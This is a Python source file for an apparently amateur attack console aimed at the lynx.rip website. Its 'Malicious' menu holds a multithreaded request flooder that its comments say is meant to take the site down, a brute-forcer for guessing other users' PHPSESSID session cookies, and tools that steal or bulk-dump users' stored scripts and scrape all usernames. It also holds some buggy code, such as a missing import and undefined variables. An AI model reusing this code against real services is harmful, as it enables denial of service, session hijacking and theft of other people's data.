# Title: pwd0console
# Date: 4/15/2021
# LVE: N/A
# OS: Windows
# Made by: pwd0kernel - pwdsec
# Profile: https://github.com/pwd0kernel
# Organization: https://github.com/pwdsec
# Description: just a tool because i was bored but
# atleast change bio works on this since its broken on the website.

# 4/19/2021 | 25 commands | idk what to add anymore lmao

# dont mind the shit codes, its my first time making a big script
# ive only started python like 5 days ago, and i fucking love python now

# TODO: Get_lynx_latest_version
# TODO: Upload_script
# TODO: find more vulnerabilities\bugs
# TODO: make a public version of this? without the "Malicious" function?
# TODO: REWRITE!!??
# TODO: new name
# TODO: update what tetunus has patched which is nothing yet lol

# and i toally need to rewrite this
# i feel like trying it in another language
# maybe rust, go, what else??


from bs4 import BeautifulSoup
from os import system
import threading
import binascii
import base64
import json
import wget
import warnings
import requests
import os

if os.name != "nt":
    print("Only works on windows.")
    exit()

os.system("title pwd0console")


warnings.filterwarnings("ignore")


def GetScriptPayload():
    payload = "6c6f63616c2061203d20227061796c6f6164223b207072696e74282261" * 1000
    payload += "22293b207072696e7428227679777730517144656e75687a7631316372" * 1000
    payload += "7234414e396e7572596371616955494744786a36744e65506352653043" * 1000
    payload += "634e3074374770775a6a5834655368747432797450576156646973756c" * 1000
    payload += "766594c6646706c57455272337a775252486b415a6143326f793547337" * 1000
    payload += "94c696d4776393251767749504a506d305042665359567779764876577" * 1000
    payload += "0357033447a636c7474327a327850374b37464e45684c7a47727257374" * 1000
    payload += "470766778777644534f56434a42334c6e3144797a4a48396a746f5a764" * 1000
    payload += "838774f61766b39484c4547725162625333464b426544434a6c7a74746" * 1000
    payload += "c39346f48424c6a43735361715872535252464b3674494f78646a47464" * 1000
    payload += "7734b714e5462433659665166665761466a41714473676a79636658414" * 1000
    payload += "554345a7062454b6d3554765a534275766339396d677655656c4278444" * 1000
    payload += "75a50307a64783472355332384936345a4a3062473849487453644a464" * 1000
    payload += "16a584831576e565a786361525576524e3639325039656d5a617568486" * 1000
    payload += "d4c6c336a5662697444696870304976743944466f677a623762734b735" * 1000
    payload += "a49534b546f52474b41707734334a7831626b4665316872624b4e48425" * 1000
    payload += "56d494a796553364173304c47564875734e594a37777058536a5166697" * 1000
    payload += "847764970486579556430494847617956446b3151715664384176306b3" * 1000
    payload += "24156514e5a716a596e4950336c6b3454504a4d4d59325054717075627" * 1000
    payload += "63341496f6b6f32414d58525936637735656c72665a57746b4c5472644" * 1000
    payload += "a726b314e4b553964574d69394a6265324364474c44386653444666785" * 1000
    payload += "06e67687a49677845545346396d61733159323377726d4d5062614f487" * 1000
    payload += "3647742324f387461706c4767426e314e3165476e436f7a574e6d6b457" * 1000
    payload += "2684d745632695a3330464f7242417134477072796d635144747058644" * 1000
    payload += "1455576757658476f4a71537265774f6374366e4467566622293b" * 1000
    return payload


def CookiesPayload():  # prob useless, but idk
    payload = "5048505345535349443d626a6364613136653239346d6b6b6c6b6e6a6e"
    payload += "71767064736c743b20757365726e616d653d574c6e4d36336333725067"
    payload += "45585641597a74394d6845253246424c78664165394e2532464e486b25"
    payload += "33443b206469643d73366178526d7757567971324a7725324666454367"
    payload += "4f69344833733276776f376878516857334b68446e3376707967772533"
    payload += "442533443b206176617461723d7278624f314a76436c55386f3051464c"
    payload += "307342794e6a335172636b5a6a4333384833334e4d3042595746756230"
    payload += "2532466d58744455797255524a52585778754d7547"
    return payload


def AcceptPayload():
    payload = "746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b78"
    payload += "6d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c696d6167"
    payload += "652f617669662c696d6167652f776562702c696d6167652f61706e672c"
    payload += "2a2f2a3b713d302e382c6170706c69636174696f6e2f7369676e65642d"
    payload += "65786368616e67653b763d62333b713d302e39"
    return payload


def UserAgentPayload():
    payload = "4d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2"
    payload += "057696e36343b2078363429204170706c655765624b69742f3533372e33"
    payload += "3620284b48544d4c2c206c696b65204765636b6f29204368726f6d652f3"
    payload += "8372e302e343238302e313431205361666172692f3533372e3336204f50"
    payload += "522f37332e302e333835362e343231"
    return payload


# main commands list for the main page
# i will prob add page 1, page 2, etc
commands = [
    "X) -\033[33m Malicious \033[0m- Will let you run\033[33m malicious/\033[31mbugs/\033[34mvulns\033[0m found on Lynx",
    "1) - AccountInfo - Will show the information of your account.",
    "2) - ChangeBio - Will change your account bio on the website.",
    "3) - UploadScript - Will upload your script to \"Cloudscript\"",
    "4) - GetLynxAddys - Will get the addresses of Lynx that it uses in the exploit.",
    "5) - GetLynxLatestVersion - Will show you the lastest version number.",
    "6) - DownloadLynx - Will download Lynx.",
    "7) - Credits - Who made this script.",
    "8) - Clear - Will clear the console.",
    "9) -\033[32m Misc \033[0m- This will let you run misc commands",
    "0) - Exit - Will exit the program.",
]

# the cool logo [pwd0console]
pwd0console = """
                  _  ___                            _      
 _ ____      ____| |/ _ \  ___ ___  _ __  ___  ___ | | ___ 
| '_ \ \ /\ / / _` | | | |/ __/ _ \| '_ \/ __|/ _ \| |/ _ \\
| |_) \ V  V / (_| | |_| | (_| (_) | | | \__ \ (_) | |  __/
| .__/ \_/\_/ \__,_|\___/ \___\___/|_| |_|___/\___/|_|\___|
|_|                                                        

"""

data = []  # Account data, where all the account information is

cloudscript = {
    # you can change this to your liking
    'title': '',
    'description': '',
    'author': GetScriptPayload(),
    'source': GetScriptPayload(),
    'protected': 'on'
}

# cloudscript spammer headers
headers = {
    'Accept': binascii.unhexlify(AcceptPayload()).decode("utf-8"),
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': '251000000000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': binascii.unhexlify(CookiesPayload()).decode("utf-8"),
    'Host': 'lynx.rip',
    'Origin': 'https://lynx.rip',
    'Referer': 'https://lynx.rip/dashboard/home/cloudscripts/create/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': binascii.unhexlify(UserAgentPayload()).decode("utf-8"),
}

# the spammer threads will be stored here
cloudspammer_threads_and_brute = []

# userlist for Get all users command
users = []

# all the cloudscript codes will be stored here
cloudscript_codes_list = []


def Get_Account_name():
    # fully done
    # i might actually rewrite this shit
    # because its badly written and rushed
    try:
        global lynx_cookies
        lynx_session = requests.Session()
        account = lynx_session.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        lynx_cookies = lynx_session.cookies.get_dict()
        soup = BeautifulSoup(account.text, "html.parser")
        for username in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            if account.status_code == 200:
                if len(username.text) != 0 and len(username.text) <= 20:
                    data.append(username.text)
                else:
                    print("There was an error logging into your account.")
                    exit()
            else:
                print("There was an error requesting the website. code: ",
                      str(account.status_code))
                Login_Alternative()
    except Exception:
        print("There was an error while getting the account name.")
        print("We will try an alternative way...")
        Login_Alternative()


def Login_Alternative():
    # This is an alternative way to login
    # it might not work, i did not test it
    # hopefully it does if the first method
    # gets patched
    try:
        data.clear()

        DID_get = input("[DID]: ")
        lynx_cookies["did"] = DID_get
        USERNAME_get = input("[USERNAME]: ")
        lynx_cookies["username"] = USERNAME_get
        AVATAR_get = input("[AVATAR]: ")
        lynx_cookies["avatar"] = AVATAR_get

        account = requests.get("https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        soup = BeautifulSoup(account.text, "html.parser")
        for username in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            if account.status_code == 200:
                if len(username.text) != 0 and len(username.text) <= 20:
                    data.append(username.text)
                else:
                    print("There was an error login into your account.")
                    exit()
            else:
                print("There was an error requesting the website. code: ",
                      str(account.status_code))
        pass
    except Exception:
        print("We could not login with method 2.")


def Change_bio(bio_text):
    # fully done
    # Original function on the website is broken
    # hopefully this one works | EDIT: it does work
    try:
        bio = requests.post("https://lynx.rip/dashboard/home/profile/", data={'bio': bio_text}, cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                                             username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        if bio.status_code == 200:
            check = requests.get("https://lynx.rip/dashboard/home/profile/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                          username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
            if check.status_code == 200:
                soup = BeautifulSoup(check.text, "html.parser")
                if len(soup.findAll("span")[14].text) == len(bio_text):
                    print("It was changed successfully.")
                else:
                    print("There was an error while changing bio.")
            else:
                print("There was an error while sending the request. code:", str(
                    check.status_code))
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while changing the bio.")


def Get_Account_bio():
    # fully done
    try:
        bio = requests.get("https://lynx.rip/dashboard/home/profile/", cookies=dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                                                                                    username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        if bio.status_code == 200:
            soup = BeautifulSoup(bio.text, "html.parser")
            if len(soup.findAll("span")[14].text) != 0:
                data.append(soup.findAll("span")[14].text)
            else:
                print("There was an error while getting your bio.")
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while getting the account bio.")


def ClearConsole():
    # fully done
    system("cls")
    print(pwd0console)
    print("----- [ Account ] -----\n")
    print("Logged in as:", data[0])
    print("Bio:", data[1])
    print("Role:", data[2])
    print("PHPSESSID:", phpid)
    print("\n----- [ Commands ] -----\n")
    for i in commands:
        print(i)


def Credits():
    # fully done
    print("Credits:")
    print("   Made by pwd0kernel - pwdsec")
    print("   Profile: https://github.com/pwd0kernel")
    print("   Organization: https://github.com/pwdsec")
    print("   Thank you to Tetunus for letting me make this project :)")
    print("   With out his 2am codes i would be bored and have no life :)")


def Account_info():
    # fully done
    print("Account Information:")
    print("   Username:", data[0])
    print("   Bio:", data[1])
    print("   PHPSESSID:", phpid)
    print("   Avatar (Encrypted):", lynx_cookies["avatar"])
    print("   Did (Encrypted):", lynx_cookies["did"])
    print("   Username (Encrypted):", lynx_cookies["username"])


def Upload_script():
    # not done
    try:
        print("Put your script in \"put_script_here.txt\" then type upload in console")
        script = open("put_script_here.txt", "wr")
        script.write("-- put your full script here")
        script.close()
        cloudscript_cmd = input("[Cloudscript]: ")
        if cloudscript_cmd.lower() == "upload":
            system("clear")
            print("uploading...")
            # if i code this, i have to do testing and tetunus will get mad
            # since its gonna upload a couple scripts on the website
            pass
        elif cloudscript_cmd.lower() == "cancel" or cloudscript_cmd.lower() == "exit":
            pass
    except Exception:
        print("There was an error while uploading the script.")


def Get_lynx_addys():
    # fully done
    try:
        addys = requests.post("http://lynx.rip/backend/updater/v2/testing/",
                              data={"version": "1.0", "checking": "get_addresses"}, verify=False)
        if addys.status_code == 200:
            addys_file = open("addys.txt", "w")
            addys_file.write(addys.text)
            addys_file.close()
            print("The addresses should be in the file \"addys.txt\"")
        else:
            print("There was an error while sending the request. code:",
                  str(bio.status_code))
    except Exception:
        print("There was an error while getting the addys.")


def Get_lynx_latest_version():
    # not done
    pass


def Download_lynx():
    # fully done
    try:
        print("Downloading...")
        wget.download("https://lynx.rip/downloads/Lynx.zip", 'Lynx.zip')
        print("Downloaded in the same folder as \"Lynx.zip\"")
    except Exception:
        print("There was an error while downloading Lynx.zip")


def Download_backend_lynx_files():
    # fully done
    try:
        print("Downloading...")
        wget.download(
            "https://lynx.rip/backend/downloads/Release.lynx", 'Lynx_backend.zip')
        print("Downloaded in the same folder as \"Lynx_backend.zip\"")
    except Exception:
        print("There was an error while downloading Lynx_backend.zip")


def Download_backend_dll():
    # fully done
    try:
        print("Downloading...")

        wget.download(
            "http://lynx.rip/backend/downloads/L09dahjd034.dll", 'lynxdll.dll')
        print("Downloaded in the same folder as \"lynxdll.dll\"")
    except Exception:
        print("There was an error while downloading lynxdll.dll")


def CloudSpammer():
    # fully done
    # this is also meant to try taking the website down
    # with all the requests it sends it might work
    # [not tested]
    try:
        while True:
            cookies = dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                           username=lynx_cookies["username"], avatar=lynx_cookies["avatar"])
            responce = requests.post("https://lynx.rip/dashboard/home/cloudscripts/create/",
                                     data=cloudscript, headers=headers, cookies=cookies, verify=False)
            if responce.status_code == 302:
                print("sent %s bytes to lynx.rip" % len(GetScriptPayload()))
            else:
                print("script not sent")
    except Exception:
        print("There was an error with cloudscripts spammer.")


def remove_cloudscript(cloud_data):
    # fully done
    if "cloudscript" not in cloud_data:
        return cloud_data
    else:
        cloud_data = cloud_data.replace("cloudscript", "")
        cloud_data = cloud_data.replace("(", "")
        cloud_data = cloud_data.replace(")", "")
        return cloud_data

# TODO: TRY CATCH


def cloudscript_request(script_code):
    # fully done
    try:
        codeofscript = remove_cloudscript(script_code)
        cloudstealer = requests.get(
            "http://lynx.rip/dashboard/home/cloudscripts/storage/" + codeofscript + "_src.lua", verify=False)
        if cloudstealer.status_code == 200:
            source = base64.b64decode(cloudstealer.content).decode('utf-8')
            print(source)
            sourcefile = open(codeofscript + ".lua", "w")
            sourcefile.write(source)
            sourcefile.close
        else:
            print("There was an error while doing the request: code: " +
                  str(cloudstealer.status_code))
    except Exception:
        print("There was an error with cloudscript request")


def Cloud_dumper():
    try:
        # im not making this yet | EDIT: NVM i fuckin did it anyways
        # since i accidentally ran the Cloudspammer, sorry tet
        print("Dumping...")
        Get_All_Cloudscripts_code()
        os.makedirs("Dump", exist_ok=True)
        for i in cloudscript_codes_list:
            cleaned = i.replace(" ", "")
            source = requests.get(
                "http://lynx.rip/dashboard/home/cloudscripts/storage/" + cleaned, verify=False)
            print("\nDumping:", source.url)
            # i decided to use this alternative way, looks cooler lol
            wget.download(source.url, "Dump\\" + cleaned)
            # source_code = base64.b64decode(source.text).decode('utf-8')
            # sourcefile = open("Dump\\" + i, "w")
            # sourcefile.write(source_code)
            # sourcefile.close()
        else:
            pass
        print("All the script are dumped in the folder \"Dump\"")
    except Exception:
        print("There was an error while dumping the cloud")


def PHPSIDBrute():
    # fully done
    # this might take a lot of time before getting an account
    # this shit could take years to get an phpsessid
    # depending on how many buyers there are
    try:
        while True:
            try:
                code = ''.join(
                    (random.choice('zxcvbnmasdfghjklqwertyuiop1234567890') for i in range(26)))
                ss = requests.Session()
                check_url = ss.get(
                    "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=code), verify=False)
                if "Login page example" in check_url.text:
                    pass
                else:
                    print(code)
                    print(ss.cookies.get_dict())
            except Exception:
                pass
    except Exception:
        print("There was an error with PHPSIDBrute.")


def Malicious():
    # dark side below:
    #   this is where all the goods are at
    #   only owners of lynx will have access to this:
    #   Tetunus? yes
    #   static? yes
    #   Lawliet? no

    # shit check that can be bypassed by changing discord username\ or changing this code lol
    # and yes i added my self, because i made this so fuck off
    if data[0] == "Tetunus" or data[0] == "static" or data[0] == "pwd0kernel":
        malicious_commands = [
            "1) -\033[33m SpamCloud \033[0m- Will spam cloudscript with a bunch of scripts.",
            "2) -\033[33m CloudScriptStealer \033[0m- Steal cloudscript scripts.",
            "3) -\033[33m ManageError \033[0m- Encryption error in manage.",
            "4) -\033[33m CreateError \033[0m- Encryption error in create.",
            "5) -\033[33m DumpCloud \033[0m- Dump the whole cloudscript.",
            "6) -\033[33m PHPSIDBrute \033[0m- Buteforce the PHPSESSID of an account.",
            "0) -\033[32m Exit \033[0m- Exit the Malicious function.",
        ]

        system("cls")
        print("\033[33m" + pwd0console + "\033[0m")
        print("----- [ Account ] -----\n")
        print("Logged in as:", data[0])
        print("Bio:", data[1])
        print("Role:", data[2])
        print("PHPSESSID:", phpid)
        print("\n----- [ Commands ] -----\n")
        for i in malicious_commands:
            print(i)

        while True:
            malicious_cmd = input("\n[\033[31mMalicious Command\033[0m]: ")
            if malicious_cmd.lower() == "SpamCloud" or malicious_cmd.lower() == "1":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    for i in range(500):
                        cloudscripts_threads = threading.Thread(
                            target=CloudSpammer)
                        cloudscripts_threads.daemon = False
                        cloudspammer_threads_and_brute.append(
                            cloudscripts_threads)

                    for i in range(500):
                        cloudspammer_threads_and_brute[i].start()

                    for i in range(500):
                        cloudspammer_threads_and_brute[i].join()
                else:
                    pass
            elif malicious_cmd.lower() == "cloudscriptstealer" or malicious_cmd.lower() == "2":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    code = input("[CloudScript]: ")
                    cloudscript_request(code)
                else:
                    pass
            elif malicious_cmd.lower() == "manageerror" or malicious_cmd.lower() == "3":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # causes the error, {did}
                    manage_error = requests.get('https://lynx.rip/dashboard/home/manage/',
                                                verify=False, cookies=dict(did='0', username='0', PHPSESSID='0'))
                    if manage_error.status_code == 200:
                        print(manage_error.text)
                    else:
                        print("There was an error occurred, request code: " +
                              str(manage_error.status_code))
                else:
                    pass
            elif malicious_cmd.lower() == "createerror" or malicious_cmd.lower() == "4":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # causes the error, {did}
                    url = requests.get('https://lynx.rip/dashboard/home/cloudscripts/create/',
                                       verify=False, cookies=dict(did='0', username='0', PHPSESSID='0'))
                    if url.status_code == 200:
                        print(url.text)
                    else:
                        print(
                            "There was an error occurred, request code: " + str(url.status_code))
                else:
                    pass
            elif malicious_cmd.lower() == "dumpcloud" or malicious_cmd.lower() == "5":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    # function here
                    Cloud_dumper()
                else:
                    pass
            elif malicious_cmd.lower() == "phpsidbrute" or malicious_cmd.lower() == "6":
                are_you_sure = input("Are You Sure? [yes/no]: ")
                if are_you_sure.lower() == "yes":
                    for i in range(500):
                        brute = threading.Thread(target=PHPSIDBrute)
                        brute.daemon = False
                        cloudspammer_threads_and_brute.append(brute)
                    for i in range(100):
                        cloudspammer_threads_and_brute[i].start()
                    for i in range(100):
                        cloudspammer_threads_and_brute[i].join()
                    pass
                else:
                    pass
            elif malicious_cmd.lower() == "exit" or malicious_cmd.lower() == "cancel" or malicious_cmd.lower() == "0" or malicious_cmd.lower() == ".":
                ClearConsole()
                break
            else:
                print("Command not found")
        else:
            print("You cannot access this")


def GetAllUsernames():
    # fully done
    # might add a counter so we can know how many buyers there is
    try:
        print("Getting all the usernames...")
        cookies = dict(PHPSESSID=phpid, did=lynx_cookies["did"],
                       username=lynx_cookies["username"], avatar=lynx_cookies["avatar"])
        users_data = requests.get(
            "https://lynx.rip/dashboard/home/userlist/", cookies=cookies, verify=False)
        soup = BeautifulSoup(users_data.text, 'html.parser')

        for i in soup.find_all("div", {"class": "font-weight-bold font-size-h5 text-light"}):
            users.append(i.text)
        print(users)
    except Exception:
        print("There was an error while getting all the usernames.")


def Get_All_Cloudscripts_code():
    # fully done
    # will making this i thought of a function that gets all the scripts
    try:
        cloudscript_codes = requests.get(
            "https://lynx.rip/dashboard/home/cloudscripts/storage/", verify=False)
        soup = BeautifulSoup(cloudscript_codes.text, "html.parser")
        for i in soup.find_all("li"):
            if "src" in i.text:
                cloudscript_codes_list.append(i.text)
            else:
                pass
    except Exception:
        print("There was an error while getting all the codes")

# useful?? idk


def SaveCookies():
    # fully done
    try:
        print("Saving Cookies...")
        cookies_txt = open("account_cookies.txt", "w")
        cookies_txt.write(str(lynx_cookies))
        cookies_txt.close()
        print("Cookies saved to \"account_cookies.txt\".")
    except Exception:
        pass


def Get_discord():
    # fully done
    try:
        print("Getting discord...")
        discord_request = requests.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        soup = BeautifulSoup(discord_request.text, "html.parser")
        if discord_request.status_code == 200:
            for link in soup.find_all("a", href=True):
                if "discord" in link["href"]:
                    print("Discord:", link["href"])
                else:
                    pass
        else:
            print("There was an error while getting the request: code:",
                  str(discord_request.status_code))
    except Exception:
        print("There was an error while getting the Discord")


def Get_updateversions():
    # fully done
    try:
        version = requests.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        soup = BeautifulSoup(version.text, "html.parser")

        if version.status_code == 200:
            for version in soup.find_all("a", {"class": "text-muted font-weight-bold font-size-lg mb-1"}):
                if "Version" in version.text:
                    print(version.text)
                else:
                    pass
        else:
            print("Error getting version, code: ", str(version.status_code))
    except Exception:
        print("There was an error while getting the versions.")


def Get_Plannedfeatures():
    # might add the % of planned features
    try:

        pdata = []

        planned = requests.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        soup = BeautifulSoup(planned.text, "html.parser")

        if planned.status_code == 200:
            for purcent in soup.find_all("span"):
                for pfeature in soup.find_all("a", {"class": "font-weight-bold text-dark-75 font-size-lg mb-1"}):
                    if "%" in purcent.text:
                        pdata.append(pfeature.text + " | " +
                                     purcent.text)  # almost working??
            for i in range(4):
                print(pdata[i])
        else:
            print("Error getting planned features: code:",
                  str(planned.status_code))
    except Exception:
        print("Error getting planned features.")


def getAllCloudCodes():
    # fully done
    try:
        print("Getting all the codes [Might take a while]...")
        Get_All_Cloudscripts_code()
        cloudsources = []
        for code in cloudscript_codes_list:
            cleaned = code.replace(" ", "")
            cleaned = cleaned.replace("src", "")
            cleaned = cleaned.replace("_", "")
            getsource = requests.get(
                "https://lynx.rip/dashboard/home/cloudscripts/storage/" + cleaned, verify=False)
            if getsource.status_code == 200:
                print("Getting:", cleaned)
                cloudsources.append(getsource.text)
            else:
                print("there was an error getting the cloud source, code:",
                      str(getsource.status_code))
        print(cloudsources)
        file_cloudsources = open("cloudsources.txt", "w")
        file_cloudsources.write(str(cloudsources))
        file_cloudsources.close()
        print("this is also saved here in \"cloudsources.txt\".")
    except Exception:
        print("There was an error while getting all the codes")


def Signout():
    try:
        signout_request = requests.get("https://lynx.rip/dashboard/signout/", cookies=dict(
            PHPSESSID=phpid, did=lynx_cookies["did"], username=lynx_cookies["username"], avatar=lynx_cookies["avatar"]), verify=False)
        if signout.status_code == 302:
            print("SignOut is successful")
        else:
            print("we cloudnt sign out, failed, code:", str(signout.status_code))
    except Exception:
        print("Sign out failed")


def GetRole():
    # fully done
    # this is pretty cool lol
    try:
        getrole = requests.get(
            "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=phpid), verify=False)
        soup = BeautifulSoup(getrole.text, "html.parser")
        if getrole.status_code == 200:
            for roles in soup.find_all("span"):
                if roles.text == "Buyer":
                    data.append("\033[33m" + roles.text + "\033[0m")
                elif roles.text == "Developer":
                    data.append("\033[36m" + roles.text + "\033[0m")
                elif roles.text == "Administrator":
                    data.append("\033[31m" + roles.text + "\033[0m")
                elif roles.text == "Moderator":
                    data.append("\033[35m" + roles.text + "\033[0m")
                elif roles.text == "Support":
                    data.append("\033[34m" + roles.text + "\033[0m")
                else:
                    pass
        else:
            print("there was an error getting the role: code: " +
                  str(getrole.status_code))
    except Exception:
        print("there was an error getting the role")


def MiscFunction():
    # fully done & lowkey cool
    misc_commands = [
        "A) -\033[36m SignOut \033[0m- Will delete your cookies",
        "1) -\033[36m GetAllUsersUsernames \033[0m- Will get all the buyers/users of lynx",
        "2) -\033[36m GetDiscord \033[0m- Will get you the Lynx discord",
        "3) -\033[36m GetAllCloud \033[0m- Will get all the cloudscripts codes.",
        "4) -\033[36m DownloadBackend \033[0m- Will download the backend lynx files.",
        "5) -\033[36m DownloadBackendDLL \033[0m- Will downlaod the backend lynx dll.",
        "6) -\033[36m SaveCookies \033[0m- Will save the cookies in a text file.",
        "7) -\033[36m GetVersions \033[0m- Will get all the versions on the dashboard.",
        "8) -\033[36m GetPlannedFeatures \033[0m- Will get all the planned features on the dashboard.",
        "9) -\033[36m GetCloudCodes \033[0m- Will get all the cloudcodes.",
        "0) -\033[32m Exit \033[0m- Exit the Misc function.",
    ]

    system("cls")
    print("\033[36m" + pwd0console + "\033[0m")
    print("----- [ Account ] -----\n")
    print("Logged in as:", data[0])
    print("Bio:", data[1])
    print("Role:", data[2])
    print("PHPSESSID:", phpid)
    print("\n----- [ Commands ] -----\n")
    for i in misc_commands:
        print(i)

    while True:
        misc_cmd = input("\n[Misc Command]: ")
        if misc_cmd.lower() == "signout" or misc_cmd.lower() == "a":
            Signout()
        elif misc_cmd.lower() == "getallusersusernames" or misc_cmd.lower() == "1":
            GetAllUsernames()
        elif misc_cmd.lower() == "getdiscord" or misc_cmd.lower() == "2":
            Get_discord()
        elif misc_cmd.lower() == "getallcloud" or misc_cmd.lower() == "3":
            Get_All_Cloudscripts_code()
            print(cloudscript_codes_list)
        elif misc_cmd.lower() == "downloadbackend" or misc_cmd.lower() == "4":
            Download_backend_lynx_files()
        elif misc_cmd.lower() == "downloadbackenddll" or misc_cmd.lower() == "5":
            Download_backend_dll()
        elif misc_cmd.lower() == "savecookies" or misc_cmd.lower() == "6":
            SaveCookies()
        elif misc_cmd.lower() == "getversions" or misc_cmd.lower() == "7":
            Get_updateversions()
        elif misc_cmd.lower() == "getplannedfeatures" or misc_cmd.lower() == "8":
            Get_Plannedfeatures()
        elif misc_cmd.lower() == "getcloudcodes" or misc_cmd.lower() == "9":
            getAllCloudCodes()
        elif misc_cmd.lower() == "exit" or misc_cmd.lower() == "cancel" or misc_cmd.lower() == "0" or misc_cmd.lower() == ".":
            ClearConsole()
            break
        else:
            print("Command not found")


try:
    system("cls")
    phpid = input("[PHPSESSID]: ")  # jda33thhn0s4s9skac2n6f8pb9
    if len(phpid) != 0 and len(phpid) <= 26 and len(phpid) >= 26:
        print("Logging in...")
        Get_Account_name()
        print("Getting Bio...")
        Get_Account_bio()
        print("Getting Role...")
        GetRole()
        system("cls")
        print(pwd0console)
        print("----- [ Account ] -----\n")
        print("Logged in as:", data[0])
        print("Bio:", data[1])
        print("Role:", data[2])
        print("PHPSESSID:", phpid)
        print("\n----- [ Commands ] -----\n")

        # print the command list.
        for i in commands:
            print(i)

        try:
            while True:
                cmd = input("\n[Command]: ")
                if cmd.lower() == "malicious" or cmd.lower() == "x":
                    Malicious()
                elif cmd.lower() == "accountinfo" or cmd.lower() == "1":
                    Account_info()
                elif cmd.lower() == "changebio" or cmd.lower() == "2":
                    bio = input("[Bio Description]: ")
                    Change_bio(bio)
                elif cmd.lower() == "uploadscript" or cmd.lower() == "3":
                    Upload_script()
                    pass
                elif cmd.lower() == "getlynxaddys" or cmd.lower() == "4":
                    Get_lynx_addys()
                elif cmd.lower() == "getlynxlatestversion" or cmd.lower() == "5":
                    Get_lynx_latest_version()
                elif cmd.lower() == "downloadlynx" or cmd.lower() == "6":
                    Download_lynx()
                elif cmd.lower() == "credits" or cmd.lower() == "7":
                    Credits()
                elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "8":
                    ClearConsole()
                elif cmd.lower() == "misc" or cmd.lower() == "9":
                    MiscFunction()
                elif cmd.lower() == "exit" or cmd.lower() == "cancel" or cmd.lower() == "0" or cmd.lower() == ".":
                    system("cls")
                    print("Thank you for using this!")
                    exit()
                else:
                    print("Command not found")
        except KeyboardInterrupt:
            system("cls")
            print("Thank you for using this!")
            exit()
    else:
        print("Please put a real PHPSESSID.")
except KeyboardInterrupt:
    system("cls")
    print("Thank you for using this!")
    exit()
except Exception:
    print("There was an error. try putting a valid PHPSESSID\nIt is possible that your PHPSESSID is outdated try logging out and then in then take the new one")
